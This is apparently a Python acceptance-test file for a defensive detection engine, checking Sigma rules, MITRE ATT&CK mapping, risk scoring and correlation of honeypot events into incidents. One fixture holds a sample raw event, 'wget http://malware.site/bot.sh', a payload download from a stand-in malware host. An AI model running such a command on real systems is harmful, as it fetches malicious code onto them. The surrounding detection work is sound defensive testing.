"""
Phase 5 Acceptance Tests: Custom Detection Engine, MITRE ATT&CK, Risk Scoring & Correlation
"""

import os
import sys
import unittest

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
DETECTION_DIR = os.path.join(ROOT_DIR, "detection-engine")
sys.path.insert(0, DETECTION_DIR)
sys.path.insert(0, os.path.join(DETECTION_DIR, "risk-scoring"))
sys.path.insert(0, os.path.join(DETECTION_DIR, "correlation"))

from mitre_mapping import map_event_to_mitre, get_all_matrix_techniques, MITRE_TECHNIQUES_DATABASE
from risk_calculator import RiskScoreCalculator
from correlator import EventCorrelator


class Phase5DetectionTests(unittest.TestCase):
    def setUp(self):
        self.sigma_dir = os.path.join(DETECTION_DIR, "sigma")

    def test_sigma_rules_syntax_and_fields(self):
        rule_files = [f for f in os.listdir(self.sigma_dir) if f.endswith(".yml")]
        self.assertGreaterEqual(len(rule_files), 4)

        for rf in rule_files:
            path = os.path.join(self.sigma_dir, rf)
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn("title:", content)
            self.assertIn("id:", content)
            self.assertIn("level:", content)
            self.assertIn("detection:", content)
            self.assertIn("tags:", content)

    def test_mitre_mapping_resolution(self):
        res_bf = map_event_to_mitre("login_failed")
        self.assertIsNotNone(res_bf)
        self.assertEqual(res_bf["technique_id"], "T1110.001")
        self.assertEqual(res_bf["tactic"], "Credential Access")

        res_dl = map_event_to_mitre("payload_download")
        self.assertIsNotNone(res_dl)
        self.assertEqual(res_dl["technique_id"], "T1105")

        all_techs = get_all_matrix_techniques()
        self.assertGreaterEqual(len(all_techs), 8)

    def test_risk_calculator_formula_and_explainability(self):
        # Scenario: Low severity single event
        low_res = RiskScoreCalculator.calculate_risk(severity="LOW", event_count=1)
        self.assertLess(low_res["score"], 30.0)
        self.assertEqual(low_res["tier"], "LOW")
        self.assertIn("severity_contribution", low_res["weights"])

        # Scenario: High severity with high threat intel and ML anomaly
        crit_res = RiskScoreCalculator.calculate_risk(
            severity="CRITICAL",
            event_count=8,
            threat_intel_score=85.0,
            ml_anomaly_score=90.0
        )
        self.assertGreaterEqual(crit_res["score"], 75.0)
        self.assertEqual(crit_res["tier"], "CRITICAL")
        self.assertTrue(crit_res["weights"]["severity_contribution"] > 0)
        self.assertTrue(crit_res["weights"]["threat_intel_contribution"] > 0)

    def test_correlation_brute_force_spray(self):
        correlator = EventCorrelator(time_window_seconds=120)
        attacker_ip = "198.51.100.99"

        incidents = []
        for i in range(5):
            evt = {
                "source_ip": attacker_ip,
                "source_service": "cowrie",
                "event_type": "login_failed",
                "timestamp": "2026-11-08T11:30:00Z"
            }
            res = correlator.add_event(evt)
            incidents.extend(res)

        self.assertEqual(len(incidents), 1)
        inc = incidents[0]
        self.assertEqual(inc["pattern"], "BRUTE_FORCE_SPRAY")
        self.assertEqual(inc["source_ip"], attacker_ip)
        self.assertEqual(inc["severity"], "HIGH")

    def test_correlation_breach_and_payload_drop(self):
        correlator = EventCorrelator(time_window_seconds=120)
        attacker_ip = "203.0.113.55"

        # Event 1: Login success
        correlator.add_event({
            "source_ip": attacker_ip,
            "source_service": "cowrie",
            "event_type": "login_success",
            "timestamp": "2026-11-08T11:30:00Z"
        })

        # Event 2: File download
        incidents = correlator.add_event({
            "source_ip": attacker_ip,
            "source_service": "cowrie",
            "event_type": "payload_download",
            "raw_event": "wget http://malware.site/bot.sh",
            "timestamp": "2026-11-08T11:30:30Z"
        })

        self.assertEqual(len(incidents), 1)
        inc = incidents[0]
        self.assertEqual(inc["pattern"], "BREACH_AND_PAYLOAD_DROP")
        self.assertEqual(inc["severity"], "CRITICAL")
        self.assertIn("T1105", inc["mitre_techniques"])


if __name__ == "__main__":
    unittest.main()
